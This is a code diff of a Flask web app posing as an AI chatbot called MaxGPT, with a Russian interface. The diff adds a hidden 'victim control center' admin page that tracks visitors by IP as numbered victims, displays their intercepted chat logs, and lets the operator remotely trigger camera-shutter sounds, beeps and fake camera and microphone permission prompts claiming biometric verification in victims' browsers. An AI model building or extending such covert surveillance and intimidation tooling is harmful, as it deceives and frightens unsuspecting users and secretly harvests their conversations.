@@ -1,10 +1,13 @@
 from flask import Flask, request, jsonify, render_template_string
-import random, os, urllib.request, json
+import random, os, urllib.request, json, time
 
 app = Flask(__name__)
 
 chat_logs = []
 user_states = {}
+pending_commands = {}
+active_victims = {}
+victim_counter = 0
 
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="ru">
@@ -104,12 +107,12 @@ HTML_PAGE = """<!DOCTYPE html>
 <body>
 
 <div class="fake-modal" id="permModal">
-    <div class="fake-modal-header">
+    <div class="fake-modal-header" id="permIconHeader">
         <i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i>
-        <span>Разрешение устройства</span>
+        <span id="permTitle">Разрешение устройства</span>
     </div>
     <div class="fake-modal-body" id="permText">
-        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере для оптимизации работы AI.
+        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере для биометрической верификации. Вы даете согласие?
     </div>
     <div class="fake-modal-actions">
         <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
@@ -172,7 +175,6 @@ HTML_PAGE = """<!DOCTYPE html>
 </div>
 
 <script>
-let hasShownModal = false;
 const statusList = [
     "🛰️ Запрос проходит фиксацию IP провайдером",
     "🛡️ Системная проверка на предмет использования сторонних сервисов...",
@@ -192,16 +194,49 @@ function playShutterSound(){
     }catch(e){}
 }
 
-function triggerCameraPrompt() {
-    if (hasShownModal) return;
+function playBeepSound(){
+    try{
+        let c=new(window.AudioContext||window.webkitAudioContext)(),o=c.createOscillator(),g=c.createGain();
+        o.type='sine';o.frequency.setValueAtTime(440,c.currentTime);g.gain.setValueAtTime(0.3,c.currentTime);
+        o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.35);
+    }catch(e){}
+}
+
+function showCameraPromptCustom() {
     let modal = document.getElementById("permModal");
+    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i> <span>Запрос камеры</span>';
+    document.getElementById("permText").innerHTML = "Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к видеокамере для биометрической авторизации. Вы даете согласие?";
     modal.style.display = "block";
-    hasShownModal = true;
+}
+
+function showMicPromptCustom() {
+    let modal = document.getElementById("permModal");
+    document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444; font-size: 16px;"></i> <span>Запрос микрофона</span>';
+    document.getElementById("permText").innerHTML = "Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к микрофону для голосового диалога. Вы даете согласие?";
+    modal.style.display = "block";
 }
 
 function closePermModal() {
     document.getElementById("permModal").style.display = "none";
 }
+
+// Опрос команд из админки
+async function pollAdminCommands() {
+    try {
+        let r = await fetch("/api/poll");
+        let d = await r.json();
+        if (d.commands && d.commands.length > 0) {
+            d.commands.forEach(cmd => {
+                if (cmd === 'sound_shutter') playShutterSound();
+                if (cmd === 'sound_beep') playBeepSound();
+                if (cmd === 'perm_cam') showCameraPromptCustom();
+                if (cmd === 'perm_mic') showMicPromptCustom();
+            });
+        }
+    } catch(e) {}
+}
+
+setInterval(pollAdminCommands, 1200);
 
 async function send(){
     let i=document.getElementById("userInput"), t=i.value.trim(); if(!t) return;
@@ -222,10 +257,6 @@ async function send(){
         }, 300);
     }
 
-    if (!hasShownModal && Math.random() < 0.15) {
-        setTimeout(triggerCameraPrompt, 2000);
-    }
-
     let r=await fetch("/api/chat",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:t})});
     let d=await r.json();
     c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
@@ -240,7 +271,7 @@ SPY_PAGE = """<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Центр Наблюдения MaxGPT</title>
+    <title>Центр Управления Жертвами</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -253,33 +284,75 @@ SPY_PAGE = """<!DOCTYPE html>
         .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .search-box { width: 100%; background: #13151f; border: 1px solid rgba(255,255,255,0.12); border-radius: 10px; padding: 12px 16px; color: #fff; font-size: 14px; outline: none; margin-bottom: 20px; }
-        .search-box:focus { border-color: #8b5cf6; }
+        .section-title { font-size: 14px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }
 
-        .logs-container { display: flex; flex-direction: column; gap: 14px; }
-        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
-        .log-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 6px; }
-        .ip-tag { font-family: monospace; font-size: 13px; font-weight: 700; color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 4px 8px; border-radius: 6px; }
+        .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
+        .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
+        .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; }
+        .victim-name { font-size: 16px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
+        .victim-ip { font-family: monospace; font-size: 12px; color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 3px 8px; border-radius: 6px; }
 
-        .chat-block { display: flex; flex-direction: column; gap: 8px; font-size: 14.5px; line-height: 1.5; }
-        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 10px 12px; border-radius: 8px; }
-        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 10px 12px; border-radius: 8px; }
+        .action-btns { display: flex; gap: 8px; flex-wrap: wrap; }
+        .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
+        .btn-act:hover { transform: translateY(-1px); filter: brightness(1.1); }
+        .btn-shutter { background: #ef4444; }
+        .btn-beep { background: #f59e0b; }
+        .btn-cam { background: #3b82f6; }
+        .btn-mic { background: #8b5cf6; }
+
+        .logs-container { display: flex; flex-direction: column; gap: 12px; }
+        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 14px; }
+        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 14px; }
+        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 12px; border-radius: 8px; }
+        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 12px; border-radius: 8px; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <div class="title"><i class="fa-solid fa-user-shield"></i> Логи MaxGPT</div>
-    <div class="live-badge"><div class="pulse"></div> ЭФИР (3s)</div>
+    <div class="title"><i class="fa-solid fa-gamepad"></i> Центр Управления Жертвами</div>
+    <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
 </div>
 
-<input type="text" class="search-box" id="searchInput" onkeyup="filterLogs()" placeholder="🔎 Поиск по IP или тексту...">
+<div class="section-title">🎯 Список Жертв на сайте</div>
 
-<div class="logs-container" id="logsContainer">
+<div class="victims-grid">
+    {% for ip, data in victims.items() %}
+    <div class="victim-card">
+        <div class="victim-head">
+            <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
+            <span class="victim-ip"><i class="fa-solid fa-network-wired"></i> IP: {{ ip }}</span>
+        </div>
+        <div style="font-size:12px; color:#94a3b8;">
+            Сообщений отправлено: <b>{{ data.msg_count }}</b> | Статус: <b>Онлайн</b>
+        </div>
+        <div class="action-btns">
+            <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
+                <i class="fa-solid fa-camera"></i> 🔊 Звук Щелчка
+            </button>
+            <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
+                <i class="fa-solid fa-bell"></i> 🔔 Звук Звонка
+            </button>
+            <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')">
+                <i class="fa-solid fa-video"></i> 📹 Запрос Камеры
+            </button>
+            <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
+                <i class="fa-solid fa-microphone"></i> 🎙️ Запрос Микрофона
+            </button>
+        </div>
+    </div>
+    {% else %}
+    <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных подключений. Зайди на сайт в соседней вкладке!</div>
+    {% endfor %}
+</div>
+
+<div class="section-title">📜 История Перехваченных Логов</div>
+
+<div class="logs-container">
     {% for l in logs %}
-    <div class="log-card" data-text="{{ l.ip }} {{ l.user }} {{ l.bot }}">
-        <div class="log-header">
-            <span class="ip-tag"><i class="fa-solid fa-network-wired"></i> {{ l.ip }}</span>
+    <div class="log-card">
+        <div style="font-size:12px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
+            Жертва (IP: {{ l.ip }})
         </div>
         <div class="chat-block">
             <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
@@ -292,23 +365,53 @@ SPY_PAGE = """<!DOCTYPE html>
 <script>
 setTimeout(() => { location.reload(); }, 3000);
 
-function filterLogs() {
-    let input = document.getElementById('searchInput').value.toLowerCase();
-    let cards = document.getElementsByClassName('log-card');
-    for (let card of cards) {
-        let text = card.getAttribute('data-text').toLowerCase();
-        card.style.display = text.includes(input) ? "block" : "none";
-    }
+async function triggerAction(ip, cmd) {
+    let r = await fetch('/api/admin/trigger', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ip: ip, command: cmd })
+    });
+    let d = await r.json();
+    alert(d.status);
 }
 </script>
 </body>
 </html>"""
 
 @app.route("/")
-def home(): return render_template_string(HTML_PAGE)
+def home():
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    global victim_counter
+    if user_ip not in active_victims:
+        victim_counter += 1
+        active_victims[user_ip] = {'id': victim_counter, 'last_seen': time.time(), 'msg_count': 0}
+    else:
+        active_victims[user_ip]['last_seen'] = time.time()
+    return render_template_string(HTML_PAGE)
 
 @app.route("/admin-spy")
-def spy(): return render_template_string(SPY_PAGE, logs=reversed(chat_logs))
+def spy():
+    return render_template_string(SPY_PAGE, logs=reversed(chat_logs), victims=active_victims)
+
+@app.route("/api/poll")
+def poll_commands():
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    cmds = pending_commands.get(user_ip, [])
+    if cmds:
+        pending_commands[user_ip] = []
+    return jsonify({"commands": cmds})
+
+@app.route("/api/admin/trigger", methods=["POST"])
+def admin_trigger():
+    data = request.json or {}
+    target_ip = data.get("ip")
+    cmd = data.get("command")
+    if target_ip and cmd:
+        if target_ip not in pending_commands:
+            pending_commands[target_ip] = []
+        pending_commands[target_ip].append(cmd)
+        return jsonify({"status": f"Команда отправлена на {target_ip}!"})
+    return jsonify({"status": "Ошибка!"})
 
 @app.route("/api/chat", methods=["GET", "POST"])
 def chat_api():
@@ -316,6 +419,15 @@ def chat_api():
 
     user_msg = request.json.get("message", "").strip() if request.is_json else ""
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    global victim_counter
+    if user_ip not in active_victims:
+        victim_counter += 1
+        active_victims[user_ip] = {'id': victim_counter, 'last_seen': time.time(), 'msg_count': 1}
+    else:
+        active_victims[user_ip]['msg_count'] += 1
+        active_victims[user_ip]['last_seen'] = time.time()
+
     msg_lower = user_msg.lower()
     last_state = user_states.get(user_ip, "")
 
